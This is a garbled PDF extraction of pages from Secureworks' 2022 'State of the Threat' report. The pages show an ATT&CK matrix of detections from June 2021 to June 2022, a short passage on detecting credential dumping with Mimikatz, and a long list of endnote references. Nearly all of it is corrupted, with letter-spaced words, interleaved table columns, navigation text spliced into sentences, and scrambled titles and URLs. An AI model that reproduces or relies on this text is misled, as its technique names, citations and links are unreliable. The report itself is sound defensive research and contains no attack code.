Ransomware Enablers:  In fo rm a t io n Compromise Infrastructure External Remote Services Deploy Container Au t o s ta r t  E x e c ution Au t o s ta r t  E x e c ution Pa ss w o r d   S t o re s D is c o v e r y Lateral Tool Transfer Audio Capture Data Encoding A lt e r n a t i v e   Pr o t o col Data Encrypted for Impact
04 G a th er   V ic tim Network  E x p lo it a t ion for Client  B o o t  o r   L o g o n   B o o t  o r   L o g o n   Bu i ld   Im a g e   o n   H ost E x p lo it a t io n  f o r   C l o u d  I n f rastructure  R e m o t e   Se rv i c e   E x fi ltr a t io n   Over
Loaders and Infostealers In fo rm a t io n Develop Capabilities Hardware Additions E xe c u t io n In it ia li z a t io n   S c ripts In it ia li z a t io n   S c ripts D e b u g ge r   E v a s i on C r ed e n t ia l  A c c e ss Di s c o v e r y Se s s io n   H ija c k i n g Automated Collection Data Obfuscation C 2  C h a n n e l Data Manipulation
G a t h e r   V i c t im   O r g   I n te r - P r o c e s s   B r o w s e r  E x t e n s i o n s C r e a t e   o r   M o d i fy  D e o b f u s c a t e / D e c o d e   C l o u d   S e r v i c e   D a s h b o a rd E x fi l t r a t i o n   O v e r   Other
I n fo r m a t i o n E s ta b l is h  A c c o u n ts P h is h i n g C o m m u n ic a t io n S y s t e m   P r o c e s s F i l e s   o r   I n f o r m a t i o n F o r c e d  A u t h e n t ic a t io n C l o u d   S e r v i c e   D i s c o v e ry R e m o t e   S e r v i c e s B r o w s e r   S e s s io n Hijacking D y n a m i c   R e s o lu t io n N e tw o r k   M e d i u m D e f a c e m ent
|     |     | R e p l ic a t io n   Th r o | u gh  | C o m p r o m i s e   C l | i en t   D o m a i n   P o l ic y   | D e p l o y   C o n t a i n | e r |     | R e pl ic a t i o n   T h r o | u gh  |     | E x fi l t r a t i o n   O v e | r   |
| --- | --- | ---------------------------- | ----- | ------------------------- | ----------------------------------- | --------------------------- | --- | --- | ----------------------------- | ----- | --- | ------------------------------ | --- |
P h i s h in g   f o r  In f o r m ation O b ta i n  C a p a b il it ie s R e m o v a b le   M e d i a N a t i v e   A P I So f t w a r e  B i n a r y M o d i fi c a t i o n F o r g e  W e b   C r e d e n t ia ls C l o u d   S t o ra g e   O b j e c t   R e m o v a b l e   M e d i a C li p b o a r d   D a t a En c r y p t e d   C h a n n e l P h y s i c a l   M e d i u m D is k   W i pe
|     |     |     |     | C r e a t e   A c c o u n t |     | D i r e c t   V o l u m e   A | c c e s s | Di s c o v er y |     | D a t a   f r o m   C l o u d   |     | E x fi l t r a ti o n   O ve | r   |
| --- | --- | --- | --- | --------------------------- | --- | ----------------------------- | --------- | --------------- | --- | ------------------------------- | --- | ---------------------------- | --- |
S e a r c h   C l o s e d   S o u r c e s Stage Capabilities S u p p ly   C h a in   C o m p romise S c h e d u led  T a s k /Job E sc a p e  t o  H o s t D o m a i n  P o l ic y   I n p u t   C a p t u r e C o n t a i n e r   a n d  R e source  S o f t w a re   D e p lo y m e n t  Tools S t o r a g e   O b je c t F a ll b a c k   C h a n n e ls W e b   S e r v ic e E n d p o in t  D e n i a l  o f   S ervice
|     | S e a r c h   O p e n   T e c h n i c a l  |     |     | C r e a t e   o r   M o d i fy  |     | M o d i fi c a ti o n | M o d i f y   A u t h e ntication  | D i s c o v e r y |     | D a t a   f r o m   C o n fi g uration  |     |     |     |
| --- | ------------------------------------------ | --- | --- | ------------------------------- | --- | --------------------- | ---------------------------------- | ----------------- | --- | --------------------------------------- | --- | --- | --- |
Exploitation of Remote  D a ta b a s e s Tr u s te d   R e la ti o n s hi p S h a r e d  M od u l e s Sy st e m   P r o c e s s Ev e n t  Tr ig g e re d  Execution Ex e c u t io n   G u a rdrails P r o c e s s De b u g g e r   E va s io n Ta i n t  S h a r e d  C o n t e n t R e p o s i t o ry In g r e s s  T o o l  T ra n s fer S c h e d u l e d   T ra n s fer F ir m w a re   C o r r u p t i o n
|     |     |     |     | Event Triggered Execution | E x p lo it a ti on for Privilege  | E x p lo it a t i o n  f o r |     | Domain Trust Discovery | U se  A l te r n a t e   | D a ta   fr o m   In formation  |     |     |     |
| --- | --- | --- | --- | ------------------------- | ---------------------------------- | ---------------------------- | --- | ---------------------- | ------------------------ | ------------------------------- | --- | --- | --- |
05 Services is Now the Most  S W e e a b rc si h te  O s/ p D e o n m   ains Valid Accounts S To o o ft ls ware Deployment  E sc a la t io n D e fe n s e   E v a s io n M In u te lt r i c - e Fa p c ti t o o n r Authentication  Au th e n ti c a t io n  Material Re p o s it o ri e s Multi-Stage Channels T C r l a o n u s d fe  A r  c D c a o t u a n  t t o  Inhibit System Recovery
|     |     |     |     | External Remote Services |     | F i le  a n d   D ir e ct o | ry   | F i l e  a n d  D irectory  |     |     |     |     |     |
| --- | --- | --- | --- | ------------------------ | --- | --------------------------- | ---- | --------------------------- | --- | --- | --- | --- | --- |
Common Access Vector S W e e a b rc si h te  V s ictim-Owned  System Services Hijack Execution Flow P e rm i s si o n s  M o d ifi cation M Re u q lt u i- e F s a t c  G to e r n  A er u a t t h io e n ntication  D i s c o v er y Data from Local System N La o y n e - r A  P p r p o li t c o a c t o io l n  Network Denial of Service
|     |     |     |                                                        | Hijack Execution Flow           |                                               | H i d e   A r t if a c t s        |                                                              | Group Policy Discovery      |            |                                                  |                             |      |                                |
| --- | --- | --- | ------------------------------------------------------ | ------------------------------- | --------------------------------------------- | --------------------------------- | ------------------------------------------------------------ | --------------------------- | ---------- | ------------------------------------------------ | --------------------------- | ---- | ------------------------------ |
|     |     |     | User Execution                                         |                                 | Process Injection                             | H i ja c k   E x e c u t ion Flow | Network Sniffing                                             |                             |            | D Sh a a ta re  f d ro  D m r   i N ve etwork    | Non-Standard Port           |      | Resource Hijacking             |
|     |     |     |                                                        | I m p l a n t   I n t e r n a l |   Im a g e                                    |                                   |                                                              | N e t w o r k   S e r v ic  | e          |                                                  |                             |      |                                |
|     |     |     | W Ins in tr d u o m w e s n  M ta a ti n o a n gement  | M o d i f y   A u t h e n t     | i c a t io n   S c h e d u l e d  T a s k/Job | Im p a i r   D e f e n s e s      | O S   C r e d e n t i a l   D                                | u mping D is c o v e r y    |            | D R e a m t a o   f v r a o b m l e     M e d ia | P r o to c o l  T u n n e l | i ng | S e rv ic e   S to p           |
|     |     |     |                                                        | P r o c e s s                   |                                               | I n d i c a t o r  R e m o v      | a l  on Host                                                 | N e t w o r k   S h a r e   | D iscovery |                                                  |                             |      |                                |
|     |     |     |                                                        |                                 | Va l id   A c c o u n t s                     | I n d i r e c t   C o m m a       | n d   S A t c e c a e l   s A s p   T p o l k ic e a n t i o | n                           |            | D a t a   S t a g e d                            | P r o x y                   |      | Sy s te m   S h u tdown/Reboot |
|     |     |     |                                                        | O f fi c e   A p p l i c a t i  | o n   S ta r tup                              | E x e c u t i o n                 |                                                              | N e t w o r k   Sn i f fi n | g          |                                                  |                             |      |                                |
Hostile Government- M a s q u e r a d i n g S Ke t e r b a l e   o r o r   s F  T o i r c g k e e   t s Em a i l  C o l l e c ti o n Re m o te   A c c e s s   S oftware
|     |     |     |     | P r e - O S   B o o t |     | M o d i f y   A u t h e n ti | c at io n   | P a s s w o r d   P o lic y |   D iscovery |     |     |     |     |
| --- | --- | --- | --- | --------------------- | --- | ---------------------------- | ----------- | --------------------------- | ------------ | --- | --- | --- | --- |
06 S p o ns o re d  A c to r  A c t iv it y  P r o c e s s S t e a l  W e b   S e s s io n   C o okie I n p u t  C a p t ur e Tra f fi c   S i g n a ling
|     |     |     |     | S c h e d u le d  T a s k | / Job | M o d i f y   C l o u d  C | o m p u t er  U n s e c ur e d   C r e d | e n t ia ls P e r i p h e r a l  D e vi | c e   |     |     |     |     |
| --- | --- | --- | --- | ------------------------- | ----- | -------------------------- | ---------------------------------------- | --------------------------------------- | ----- | --- | --- | --- | --- |
S ho w s  a  R e g io na l  F o c u s S er v e r  S o ft w a r e   In f r a s t r u c t u r e D is c o v e r y S c r e e n  C a p t ure W e b   S e r v i c e
06 C o m p o n e n t M o d i f y   R e g i st ry P e r m i s si o n Groups
|     |     |     |     |                           |     |                                 |     | D is c o v e r y  |     | Video Capture |     |     |     |
| --- | --- | --- | --- | ------------------------- | --- | ------------------------------- | --- | ----------------- | --- | ------------- | --- | --- | --- |
|     |     |     |     | Tr a ffi c  S i g n aling |     | M o d i f y   Sy s t e m  Image |     | Process Discovery |     |               |     |     |     |
|     |     |     |     | Valid Accounts            |     | N e t w o r k Boundary          |     |                   |     |               |     |     |     |
|     |     |     |     |                           |     | Br i d g in g                   |     | Query Registry    |     |               |     |     |     |
Obfuscated Files or
|                             |                           |     |     |     |     | Information             |     | Remote System Discovery    |     |     |     |     |     |
| --------------------------- | ------------------------- | --- | --- | --- | --- | ----------------------- | --- | -------------------------- | --- | --- | --- | --- | --- |
| Defense Evasion Offers Its  |                           |     |     |     |     | Plist File Modification |     |                            |     |     |     |     |     |
| 07                          | PLATFORMS                 |     |     |     |     | Pre-OS Boot             |     | Software Discovery         |     |     |     |     |     |
| Own Detection Opportunities |                           |     |     |     |     |                         |     | S y s te m  I n formation  |     |     |     |     |     |
|                             | Linux, MacOS, Windows,    |     |     |     |     | Process Injection       |     | D is c o ve r y            |     |     |     |     |     |
|                             |                           |     |     |     |     | Reflective Code Loading |     | System Location            |     |     |     |     |     |
|                             | PRE, Containers, Network, |     |     |     |     | Rogue Domain Controller |     | Discovery                  |     |     |     |     |     |
|                             |                           |     |     |     |     | Rootkit                 |     | S y s t em  N e t w o r k  |     |     |     |     |     |
07 Office 365, SaaS, Google C o n fi gu ra t io n   D i scovery
|     |                           |     |     |     |     | S u b v e r t   T r u s t  C | o n t r o ls | S y s t e m   N e t w o r k |              |     |     |     |     |
| --- | ------------------------- | --- | --- | --- | --- | ---------------------------- | ------------ | --------------------------- | ------------ | --- | --- | --- | --- |
|     | Workspace, IaaS, Azure AD |     |     |     |     | S y s t e m   B i n a r y  P | r o x y      | C o n n ec tio n s   D i    | s c o v e ry |     |     |     |     |
08 Conclusion Ex e c u t i o n S y s t e m   O w n e r / U s e r
|     |     |     |     |     |     | System Script Proxy  |     | Discovery |     |     |     |     |     |
| --- | --- | --- | --- | --- | --- | -------------------- | --- | --------- | --- | --- | --- | --- | --- |
Execution
|     |        |     |     |     |     | Template Injection            |       | System Service Discovery     |     |        |     |     |     |
| --- | ------ | --- | --- | --- | --- | ----------------------------- | ----- | ---------------------------- | --- | ------ | --- | --- | --- |
|     | DOMAIN |     |     |     |     |                               |       | System Time Discovery        |     | LEGEND |     |     |     |
|     |        |     |     |     |     | Traffic Signaling             |       | V ir tu a l ization/Sandbox  |     |        |     |     |     |
|     |        |     |     |     |     | T r u s t e d   D e v e l o p | e r   | Ev a si o n                  |     |        |     |     |     |
08 The Secureworks   U t il it i e s  P r o x y   E x e c ution
Unused/Unsupported
| 09 View of the Threat | Enterprise ATT&CK v11 |     |     |     |     | Cloud Regions  |     |     |     |     |         |     |         |
| --------------------- | --------------------- | --- | --- | --- | --- | -------------- | --- | --- | --- | --- | ------- | --- | ------- |
|                       |                       |     |     |     |     | Use Alternate  |     |     |     | 0.0 | 140 280 | 420 | 560 700 |
Authentication Material
Valid Accounts
Virtualization/Sandbox
Evasion
Weaken Encryption
XSL Script Processing
Figure 42. Taegis countermeasure detections mapped to the ATT&CK matrix for the period June 2021 - June 2022. (Source: Secureworks and MITRE's ATT&CK Navigator111)
|     |     |     |     |     |     |     |     |     | 2022 State of the Threat: A Year in Review |     |     |     | 66  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | ------------------------------------------ | --- | --- | --- | --- |

The detections applied to Taegis XDR focus on being able to detect
01 Letter From Our CTIO specific instantiations of a given technique. For example, in the case
of 'OS Credential Dumping' (T1003112) there are myriad ways that an
adversary can dump credentials, ranging from the 'living off the land'
Executive Summary
02
and Key Findings technique described on page 38, to use of functionality provided by
tools like Mimikatz to dump credentials in memory (figure 43).
Ransomware Remains the
03 It is through applying a broad and deep understanding of the threat,
Primary Strategic Threat
coupled with excellent visibility from different security controls across
endpoint, network, and cloud, that organizations can rapidly increase
Ransomware Enablers: their security maturity and detect threats as early as possible in the
04
Loaders and Infostealers
attack lifespan.
Exploitation of Remote
05 Services is Now the Most
Common Access Vector
Hostile Government-
06 Sponsored Actor Activity
Shows a Regional Focus
06
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
Figure 43. In-memory detection of Mimikatz credential theft tool.
(Source: Secureworks)
2022 State of the Threat: A Year in Review 67

1   Learning from Incident Response: 2021 Year in Review,  15  GOLD SOUTHFIELD threat group profile, Secureworks.  29  GOLD LAGOON threat group profile, Secureworks.
Secureworks.   https://www.secureworks.com/research/threat-profiles/ https://www.secureworks.com/research/threat-profiles/
|     | https://www.secureworks.com/resources/rp-learning-from- |     |     | gold-southfield |     |     |     | gold-lagoon |     |     |
| --- | ------------------------------------------------------- | --- | --- | --------------- | --- | --- | --- | ----------- | --- | --- |
incident-response-team-2021-year-in-review
|     |     |     |     | 16  Customer Advisory: Kaseya VSA Software Under Active  |     |     |     | 30  GOLD SWATHMORE threat group profile, Secureworks.  |     |     |
| --- | --- | --- | --- | -------------------------------------------------------- | --- | --- | --- | ------------------------------------------------------ | --- | --- |
01 2  LeGttOeLrD F UrLoRmIC KO tuhrre aCt TgrIoOup profile, Secureworks.   Attack, Secureworks.  https://www.secureworks.com/research/threat-profiles/gold-
|     | https://www.secureworks.com/research/threat-profiles/ |     |     | https://www.secureworks.com/blog/kaseya-vsa-software- |     |     |     | swathmore |     |     |
| --- | ----------------------------------------------------- | --- | --- | ----------------------------------------------------- | --- | --- | --- | --------- | --- | --- |
|     | gold-ulrick                                           |     |     | under-active-attack                                   |     |     |     |           |     |     |
31  BishopFox / sliver, accessed 8/4/22.
https://github.com/BishopFox/sliver
| 3   | Executive Summary  GOLD LOUNGE threat group profile, Secureworks.  |     |     | 17  EXCLUSIVE Governments turn tables on ransomware  |     |     |     |     |     |     |
| --- | ------------------------------------------------------------------ | --- | --- | ---------------------------------------------------- | --- | --- | --- | --- | --- | --- |
|     | https://www.secureworks.com/research/threat-profiles/              |     |     | gang REvil by pushing it offline, Reuters, accessed  |     |     |     |     |     |     |
02
angdo lKd-eloyu nFgeindings 8/2/22.   32  WhisperGate: Not NotPetya, Secureworks.
|     |                                                 |     |     | https://www.reuters.com/technology/exclusive-governments- |     |     |     | https://www.secureworks.com/blog/whispergate-not- |     |     |
| --- | ----------------------------------------------- | --- | --- | --------------------------------------------------------- | --- | --- | --- | ------------------------------------------------- | --- | --- |
| 4   | Treasury Sanctions Evil Corp, the Russia-Based  |     |     | turn-tables-ransomware-gang-revil-by-pushing-it-          |     |     |     | notpetya                                          |     |     |
offline-2021-10-21/
Cybercriminal Group Behind Dridex Malware, U.S.
Department of the Treasury, accessed 7/27/22.
Ransomware Remains the  33  GOLD PRELUDE threat group profile, Secureworks.
https://home.treasury.gov/news/press-releases/sm845 18  Russia takes down REvil hacking group at U.S. request -  https://www.secureworks.com/research/threat-profiles/
03 Primary Strategic Threat
|     |                                                 |     |     | FSB, Reuters, accessed 7/27/22.            |     |     |     | gold-prelude |     |     |
| --- | ----------------------------------------------- | --- | --- | ------------------------------------------ | --- | --- | --- | ------------ | --- | --- |
| 5   | GOLD DRAKE threat group profile, Secureworks.   |     |     | https://www.reuters.com/technology/russia- |     |     |     |              |     |     |
https://www.secureworks.com/research/threat-profiles/ arrests-dismantles-revil-hacking-group-us-request- 34  GOLD ZODIAC threat group profile, Secureworks.
|     | gold-drake |     |     | report-2022-01-14/ |     |     |     |     |     |     |
| --- | ---------- | --- | --- | ------------------ | --- | --- | --- | --- | --- | --- |
https://www.secureworks.com/research/threat-profiles/
gold-zodiac
Ransomware Enablers:
| 04 6  | To HADES and Back: UNC2165 Shifts to LOCKBIT to                       |     |     | 19  REvil Development Adds Confidence About GOLD  |     |     |     |     |     |     |
| ----- | --------------------------------------------------------------------- | --- | --- | ------------------------------------------------- | --- | --- | --- | --- | --- | --- |
|       | LoEavdadeer sS aannctdio nIns,f oMasntediaanlet,r asccessed 8/4/22.   |     |     | SOUTHFIELD Reemergence , Secureworks.             |     |     |     |     |     |     |
35  Raccoon Stealer malware suspends operations due to
https://www.mandiant.com/resources/unc2165-shifts-to- https://www.secureworks.com/blog/revil-development-adds- war in Ukraine, Bleeping Computer, accessed 7/28/22.
confidence-about-gold-southfield-reemergence
evade-sanctions https://www.bleepingcomputer.com/news/security/raccoon-
stealer-malware-suspends-operations-due-to-war-in-ukraine/
| 7   | Cryptocurrency tumbler, Wikipedia, accessed 7/27/22.  |     |     | 20  REvil prosecutions reach a 'dead end,' Russian media  |     |     |     |     |     |     |
| --- | ----------------------------------------------------- | --- | --- | --------------------------------------------------------- | --- | --- | --- | --- | --- | --- |
Exploitation of Remote
https://en.wikipedia.org/wiki/Cryptocurrency_tumbler reports, Cyberscoop, accessed 8/2/22.   36  Business Email Compromise: The $43 Billion Scam,
| 05  | Services is Now the Most  |     |     | https://www.cyberscoop.com/revil-prosecutions-reach-a- |     |     |     |     |     |     |
| --- | ------------------------- | --- | --- | ------------------------------------------------------ | --- | --- | --- | --- | --- | --- |
Federal Bureau of Investigation, accessed 7/28/22.
8  CoGmOLmDo BnL AACcKcBUeRsNs  tVhreecatt ogrroup profile, Secureworks.  dead-end-russian-media-reports/ https://www.ic3.gov/Media/Y2022/PSA220504
https://www.secureworks.com/research/threat-profiles/
|     | gold-blackburn |     |     | 21  GOLD BLAZER threat group profile, Secureworks.  |     |     |     |     |     |     |
| --- | -------------- | --- | --- | --------------------------------------------------- | --- | --- | --- | --- | --- | --- |
37  Federal Bureau of Investigation Internet Crime Report
|     |     |     |     | https://www.secureworks.com/research/threat-profiles/ |     |     |     | 2021, Federal Bureau of Investigation, accessed 7/8/22.  |     |     |
| --- | --- | --- | --- | ----------------------------------------------------- | --- | --- | --- | -------------------------------------------------------- | --- | --- |
GOLD-BLAZER
9  Reward Offers for Information to Bring Conti  https://www.ic3.gov/Media/PDF/AnnualReport/2021_
|     | HoRsatnilseo mGwoarvee Vranrimanet nCto--Conspirators to Justice, U.S.  |                                                       |     |                                                        |     |     |     | IC3Report.pdf |     |     |
| --- | ----------------------------------------------------------------------- | ----------------------------------------------------- | --- | ------------------------------------------------------ | --- | --- | --- | ------------- | --- | --- |
| 06  | SpDoenpsaortmreednt  Aofc Sttoatre ,A accctievsisteyd  8/4/22.          |                                                       |     | 22  GOLD HAWTHORNE threat group profile, Secureworks.  |     |     |     |               |     |     |
|     | h tt ps :// w w w. st at e                                              | .g o v/ r e w ar d- o ffers-for-information-to-bring- |     | https://www.secureworks.com/research/threat-profiles/  |     |     |     |               |     |     |
Sh o w s   a  R e g i o n a l   F o c u s 38  KNOWN EXPLOITED VULNERABILITIES CATALOG, CISA.
06 conti-ransomware-variant-co-conspirators-to-justice/ GOLD-HAWTHORNE https://www.cisa.gov/known-exploited-vulnerabilities-catalog
23  GOLD MATADOR threat group profile, Secureworks.
10  Latvian National Charged for Alleged Role in  39  Taegis™ VDR.
Transnational Cybercrime Organization, Department of  https://www.secureworks.com/research/threat-profiles/ https://www.secureworks.com/products/taegis/vdr
GOLD-MATADOR
DeJfuesnticsee,  aEcvcaesssieodn 7 /O27f/f2e2r.s  Its
| 07  | ht tp s :// w w w .ju s tic | e. g ov /o p a/ p r /la tv ia n- | national-charged- |     |     |     |     |     |     |     |
| --- | --------------------------- | -------------------------------- | ----------------- | --- | --- | --- | --- | --- | --- | --- |
Ow n   D e t e c t io n   O p p o r t u n it ie s 40  Spring Framework, Slintel, accessed 7/28/22.
alleged-role-transnational-cybercrime-organization 24  GOLD TOMAHAWK threat group profile, Secureworks.  https://www.slintel.com/tech/web-framework/spring-
https://www.secureworks.com/research/threat-profiles/GOLD-
framework-market-share
| 11  | GOLD ULRICK Leaks Reveal Organizational Structure  |     |     | TOMAHAWK |     |     |     |     |     |     |
| --- | -------------------------------------------------- | --- | --- | -------- | --- | --- | --- | --- | --- | --- |
07
and Relationships, Secureworks.   41  Spring Framework RCE, Early Announcement, Spring,
Cohnttpcsl:u//wsiwown.secureworks.com/blog/gold-ulrick-leaks-reveal-
08 25  GOLD RAINFOREST threat group profile, Secureworks.  accessed 7/28/22.
organizational-structure-and-relationships https://www.secureworks.com/research/threat-profiles/ https://spring.io/blog/2022/03/31/spring-framework-rce-
|     |                                                       |                           |     | gold-rainforest |                             |                                      |                    | early-announcement |     |     |
| --- | ----------------------------------------------------- | ------------------------- | --- | --------------- | --------------------------- | ------------------------------------ | ------------------ | ------------------ | --- | --- |
| 12  | One of the world's biggest hacker forums taken down,  |                           |     |                 |                             |                                      |                    |                    |     |     |
|     | E u r o p o l ,   a c c e s s                         | e d   7 / 2 7 / 2 2 .     |     | 26  G O L D     |   C R E S T W O O D   t h r | e a t  g r o u p   p r o fi l e ,  S | e c u r e w orks.  |                    |     |     |
0 8 T h e  t pS e cw uw wr e. w oo r k se u   r 42  L o g 4 S h e l l :  E a s y   t o   L a u n c h   t h e   A t t a c k   b u t   H a r d   to  Stick
h t s : / / e u r p o l. o p a . e u / m e d i a -p r e s s/ n e w s r o o m / h t tp s :// w w w .s e c u r e w o r k s. c o m / r e s ea r c h / t h r e a t- p ro fi l e s/ t h e   L a n d i n g ? ,  S e c u re w o r k s .
| 0 9 | V ie n w e w   so / o f n  t e h - o e f -  w T o h r | l dr e % a E 2t % 8 0 % 9 9 s -b i g g | e s t -h a c k er - f o ru m s- | G O L D | - C R E S T W O O D |     |     |                                                 |                                    |                                       |
| --- | ----------------------------------------------------- | -------------------------------------- | ------------------------------- | ------- | ------------------- | --- | --- | ----------------------------------------------- | ---------------------------------- | ------------------------------------- |
|     |                                                       |                                        |                                 |         |                     |     |     | h t t p s :/ / w w w . s                        | e c u r e w o r k s . c o m / b lo | g / l o g 4 s h e ll - e a s y -t o - |
|     | taken-down                                            |                                        |                                 |         |                     |     |     | launch-the-attack-but-hard-to-stick-the-landing |                                    |                                       |
27  Lazy Passwords Become Rocket Fuel for Emotet SMB
| 13  | 4 GOLD MYSTIC threat group profile, Secureworks.  |     |     | Spreader, Secureworks.   |     |     |     |     |     |     |
| --- | ------------------------------------------------- | --- | --- | ------------------------ | --- | --- | --- | --- | --- | --- |
43  Malicious Cyber Actors Continue to Exploit Log4Shell
https://www.secureworks.com/research/threat-profiles/ https://www.secureworks.com/blog/lazy-passwords-become- in VMware Horizon Systems, CISA, accessed 7/28/22.
|     | gold-mystic |     |     | rocket-fuel-for-emotet-smb-spreader |     |     |     |     |     |     |
| --- | ----------- | --- | --- | ----------------------------------- | --- | --- | --- | --- | --- | --- |
https://www.cisa.gov/uscert/ncas/alerts/aa22-174a
14  BlueCrab ransomware that keeps performing detection  28  Emotet botnet comeback orchestrated by Conti  44  Exploits created for critical F5 BIG-IP flaw, install patch
evasion, ASEC, accessed 7/27/22.   ransomware gang, Bleeping Computer, accessed  immediately, Bleeping Computer, accessed 7/28/22.
https://asec-ahnlab-com.translate.goog/jp/19952/?_x_tr_ 7/27/22.   https://www.bleepingcomputer.com/news/security/exploits-
sl=ja&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc https://www.bleepingcomputer.com/news/security/emotet- created-for-critical-f5-big-ip-flaw-install-patch-immediately/
botnet-comeback-orchestrated-by-conti-ransomware-gang/
2022 State of the Threat: A Year in Review 68

45  Microsoft discovers threat actor targeting SolarWinds  58  Taking Action Against Hackers in Iran, Meta, accessed  72  Uncovering MosesStaff techniques: Ideology over
Serv-U software with 0-day exploit, Microsoft,  7/282//.   Money, Check Point, accessed 7/28/22.
accessed 7/28/22.   https://about.fb.com/news/2021/07/taking-action-against- https://research.checkpoint.com/2021/mosesstaff-targeting-
| https://www.microsoft.com/security/blog/2021/07/13/ | hackers-in-iran/ | israeli-companies/ |
| --------------------------------------------------- | ---------------- | ------------------ |
microsoft-discovers-threat-actor-targeting-solarwinds-serv-
u-software-with-0-day-exploit/ 59  COBALT FIRESIDE threat group profile, Secureworks.  73  StrifeWater RAT: Iranian APT Moses Staff Adds New
01 Letter From Our CTIO https://www.secureworks.com/research/threat-profiles/ Trojan to Ransomware Operations, Cybereason,
46  Threat actor DEV-0322 exploiting ZOHO ManageEngine  cobalt-fireside accessed 7/28/22.
ADSelfService Plus, Microsoft, accessed 7/28/22.   https://www.cybereason.com/blog/research/strifewater-rat-
https://www.microsoft.com/security/blog/2021/11/08/ 60  Media Coverage Doesn't Deter Actor From Threatening  iranian-apt-moses-staff-adds-new-trojan-to-ransomware-
| threat-actor-dev-0322-exploiting-zoho-manageengine- |                                                          | operations |
| --------------------------------------------------- | -------------------------------------------------------- | ---------- |
| Executive Summary                                   | Democratic Voters, Proofpoint, accessed 7/28/22.         |            |
| adselfservice-plus/                                 | https://www.proofpoint.com/us/blog/threat-insight/media- |            |
02
and Key Findings coverage-doesnt-deter-actor-threatening-democratic-voters 74  Russian Law Enforcement Take Down Several
47  MysterySnail attacks with Windows zero-day, Kaspersky,  Cybercrime Forums, Security Week, accessed 7/29/22.
accessed 7/28/22.   61  COBALT MIRAGE Conducts Ransomware Operations in  https://www.securityweek.com/russian-law-enforcement-
https://securelist.com/mysterysnail-attacks-with-windows- U.S., Secureworks.   take-down-several-cybercrime-forums
| zero-day/104509/ | https://www.secureworks.com/blog/cobalt-mirage-conducts- |     |
| ---------------- | -------------------------------------------------------- | --- |
Ransomware Remains the
|     | ransomware-operations-in-us | 75  NotPetya Campaign: What We Know About the Latest  |
| --- | --------------------------- | ----------------------------------------------------- |
03 48 PriBmRaOrNyZ ES StTrAaRtLeIgGHicT  RTahnrseoamtware Operations Use HUI
Global Ransomware Attack, Secureworks.
Loader, Secureworks.   62  Espionage Campaign Targets Telecoms Organizations  https://www.secureworks.com/blog/notpetya-campaign-
https://www.secureworks.com/research/bronze-starlight- across Middle East and Asia, Symantec, accessed  what-we-know-about-the-latest-global-ransomware-attack
ransomware-operations-use-hui-loader
7/28/22.
|     | https://symantec-enterprise-blogs.security.com/blogs/threat- | 76  Russia behind cyber-attack with Europe-wide impact  |
| --- | ------------------------------------------------------------ | ------------------------------------------------------- |
Ransomware Enablers:
04 49  A41APT case ~ Analysis of the Stealth APT Campaign  intelligence/espionage-campaign-telecoms-asia-middle-east an hour before Ukraine invasion, GOV.UK, accessed
LoTahdreeartsen ainngd J aIpnafno, sJtPeCaElReTr, saccessed 7/28/22.
7/28/22.
http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa- 63  COBALT FOXGLOVE threat group profile, Secureworks.  https://www.gov.uk/government/news/russia-behind-cyber-
yanagishita_en.pdf https://www.secureworks.com/research/threat-profiles/ attack-with-europe-wide-impact-an-hour-before-ukraine-
|     | cobalt-foxglove | invasion |
| --- | --------------- | -------- |
50  BRONZE RIVERSIDE threat group profile, Secureworks.
Exploitation of Remote
https://www.secureworks.com/research/threat-profiles/ 64  COBALT AGORA threat group profile, Secureworks.  77  News, CERT-UA.
05 SeBrRvOicNeZEs-R iIsVE NRSoIDwE the Most  https://www.secureworks.com/research/threat-profiles/ https://cert.gov.ua/articles
| Common Access Vector | cobalt-agora |     |
| -------------------- | ------------ | --- |
51  The United States, Joined by Allies and Partners,  78  Cyber attack of the Sandworm group (UAC-0082)
Attributes Malicious Cyber Activity and Irresponsible  on the energy facilities of Ukraine using malicious
65  COBALT LYCEUM threat group profile, Secureworks.
State Behavior to the People's Republic of China, The  https://www.secureworks.com/research/threat-profiles/ programs INDUSTROYER2 and CADDYWIPER (CERT-
White House, accessed 7/28/22.   cobalt-lyceum UA#4435), CERT-UA, accessed 7/28/22.
Hohstttpilse:// wGwow.vwehirtenhmouesen.gto-v/briefing-room/ https://cert.gov.ua/article/39518
| 06 Spsotantesmoernetsd-re Aleacsteos/r2 0A2c1/t0i7v/i1t9y/ the-united-states- | 66  Evolving trends in Iranian threat actor activity -  |     |
| ----------------------------------------------------------------------------- | ------------------------------------------------------- | --- |
j oin e d- b y - all ie s- a nd - pa rt n er s- at tributes-malicious-
Sh o w s   a   R e g i o n a l  F o c u s MSTIC presentation at CyberWarCon 2021, Microsoft,  79  Mass distribution of the JesterStealer malware using
06 cyber-activity-and-irresponsible-state-behavior-to-the- accessed 7/28/22.   the theme of a chemical attack (CERT-UA#4625), CERT-
peoples-republic-of-china/
|                                                          | https://www.microsoft.com/security/blog/2021/11/16/     | UA, accessed 7/28/22.             |
| -------------------------------------------------------- | ------------------------------------------------------- | --------------------------------- |
|                                                          | evolving-trends-in-iranian-threat-actor-activity-mstic- | https://cert.gov.ua/article/40135 |
| 52  BRONZE PRESIDENT threat group profile, Secureworks.  | presentation-at-cyberwarcon-2021/                       |                                   |
Dehftetpns:s//ew wEwv.saecsuiorenwo Orksf.fceomrs/r eItssea rch/threat-profiles/
80  CERT-UA, Facebook, accessed 7/28/22.
07 br on ze -p r es id e n t https://www.facebook.com/UACERT/posts/312939130865352
| Ow n  D e t e c t i o n Opportunities | 67  Log4j2 In The Wild | Iranian-Aligned Threat Actor  |     |
| ------------------------------------- | ------------------------------------------------------ | --- |
"TunnelVision" Actively Exploiting VMware Horizon,
53  BRONZE PRESIDENT Targets Russian Speakers with  SentinelOne, accessed 7/28/22.   81  MOONSCAPE threat group profile, Secureworks.
Updated PlugX, Secureworks.  https://www.sentinelone.com/labs/log4j2-in-the-wild-iranian- https://www.secureworks.com/research/threat-profiles/
07
| https://www.secureworks.com/blog/bronze-president-    | aligned-threat-actor-tunnelvision-actively-exploiting-vmware- | moonscape |
| ----------------------------------------------------- | ------------------------------------------------------------- | --------- |
| Cotanrgceltus-sriuossnian-speakers-with-updated-plugx | horizon/                                                      |           |
08
82  Cyber attacks by groups associated with China against
